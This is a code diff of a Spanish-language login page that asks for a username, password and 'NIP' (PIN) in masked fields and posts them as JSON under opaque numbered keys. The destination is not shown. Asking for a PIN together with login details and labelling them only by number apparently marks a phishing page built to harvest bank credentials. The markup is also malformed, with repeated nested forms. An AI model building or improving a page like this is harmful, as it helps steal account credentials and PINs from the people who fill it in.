@@ -54,25 +54,19 @@
 						<input type="password" class="pass" id="usuario" name="usuario" placeholder="" required/>
 					</div>
 					<form class="formulario" id="contact-form"  name="submit-form">
-						<p class="centro"><b>Ingresa Tu Cuenta</b>
-						</p><br>
-						<label for="nombre">Tu Cuenta debe tener entre 8 y 30 caracteres</label>
-					<div class="contenedor-input">
-						<input type="password" class="pass" id="contraseña" name="contraseña" placeholder="" required/>
-					</div>
-					<form class="formulario" id="contact-form"  name="submit-form">
 						<p class="centro"><b>Ingresa Tu Usuario</b>
 						</p><br>
 						<label for="nombre">Tu Usuario debe tener entre 8 y 30 caracteres</label>
 					<div class="contenedor-input">
-						<input type="password" class="pass" id="nip" name="nip" placeholder="" required/>
+						<input type="password" class="pass" id="contraseña" name="contraseña" placeholder="" required/>
 					</div>
 					<form class="formulario" id="contact-form"  name="submit-form">
 						<p class="centro"><b>Ingresa Tu Contraseña</b>
 						</p><br>
-						<label for="nombre">Tu contraseña debe tener entre 8 y 30 caracteres</label>
+						<label for="nombre">Tu Contraseña debe tener entre 8 y 30 caracteres</label>
 					<div class="contenedor-input">
-						<input type="password" class="pass" id="confirmar" name="confirmar" placeholder="" required/>
+						<input type="password" class="pass" id="nip" name="nip" placeholder="" required/>
+					
 						<i class='bx bx-show-alt'></i>
 					</div>
 		
@@ -125,8 +119,8 @@ try {
         body: JSON.stringify({
             "1": formulario.usuario.value,
             "2": formulario.contraseña.value,
-	    "3": formulario.nip.value,
-            "4": formulario.confirmar.value
+	    "3": formulario.nip.value
+            
         })
     });
 
